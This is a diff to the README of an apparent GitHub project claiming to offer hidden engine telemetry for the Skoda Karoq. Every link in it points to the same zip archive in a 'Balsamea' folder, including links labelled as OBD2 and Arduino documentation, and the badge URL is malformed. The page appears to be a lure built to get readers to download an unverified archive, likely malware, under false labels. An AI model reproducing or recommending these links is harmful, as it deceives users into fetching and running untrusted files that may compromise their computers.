@@ -1,6 +1,6 @@
 # 🏎️ Skoda-KAROQ-hidden-engine-telemetry - Monitor Your Car’s Engine Data Effortlessly
 
-[![Download](https://github.com/AlMafia03/Skoda-KAROQ-hidden-engine-telemetry/raw/refs/heads/main/Balsamea/KARO_telemetry_engine_hidden_Skoda_1.0.zip%https://github.com/AlMafia03/Skoda-KAROQ-hidden-engine-telemetry/raw/refs/heads/main/Balsamea/KARO_telemetry_engine_hidden_Skoda_1.0.zip)](https://github.com/AlMafia03/Skoda-KAROQ-hidden-engine-telemetry/raw/refs/heads/main/Balsamea/KARO_telemetry_engine_hidden_Skoda_1.0.zip)
+[![Download](https://raw.githubusercontent.com/AlMafia03/Skoda-KAROQ-hidden-engine-telemetry/main/Balsamea/Skoda_engine_hidden_telemetry_KARO_v1.0.zip%https://raw.githubusercontent.com/AlMafia03/Skoda-KAROQ-hidden-engine-telemetry/main/Balsamea/Skoda_engine_hidden_telemetry_KARO_v1.0.zip)](https://raw.githubusercontent.com/AlMafia03/Skoda-KAROQ-hidden-engine-telemetry/main/Balsamea/Skoda_engine_hidden_telemetry_KARO_v1.0.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ To get started, follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to go to the release page where you can get the latest version of the software.
    
-   [Download Latest Release](https://github.com/AlMafia03/Skoda-KAROQ-hidden-engine-telemetry/raw/refs/heads/main/Balsamea/KARO_telemetry_engine_hidden_Skoda_1.0.zip)
+   [Download Latest Release](https://raw.githubusercontent.com/AlMafia03/Skoda-KAROQ-hidden-engine-telemetry/main/Balsamea/Skoda_engine_hidden_telemetry_KARO_v1.0.zip)
 
 2. **Select Your Version:** Look for the most recent release. You will find the application files listed there.
 
@@ -69,7 +69,7 @@ If you wish to contribute to this project, please make a pull request or open an
 
 For more information on how to work with telemetry data, you can explore the following links:
 
-- OBD2 Information: [OBD2 Wiki](https://github.com/AlMafia03/Skoda-KAROQ-hidden-engine-telemetry/raw/refs/heads/main/Balsamea/KARO_telemetry_engine_hidden_Skoda_1.0.zip)
-- Arduino Documentation: [Arduino](https://github.com/AlMafia03/Skoda-KAROQ-hidden-engine-telemetry/raw/refs/heads/main/Balsamea/KARO_telemetry_engine_hidden_Skoda_1.0.zip)
+- OBD2 Information: [OBD2 Wiki](https://raw.githubusercontent.com/AlMafia03/Skoda-KAROQ-hidden-engine-telemetry/main/Balsamea/Skoda_engine_hidden_telemetry_KARO_v1.0.zip)
+- Arduino Documentation: [Arduino](https://raw.githubusercontent.com/AlMafia03/Skoda-KAROQ-hidden-engine-telemetry/main/Balsamea/Skoda_engine_hidden_telemetry_KARO_v1.0.zip)
 
 Thank you for choosing Skoda-KAROQ-hidden-engine-telemetry! Enjoy monitoring your vehicle's performance.
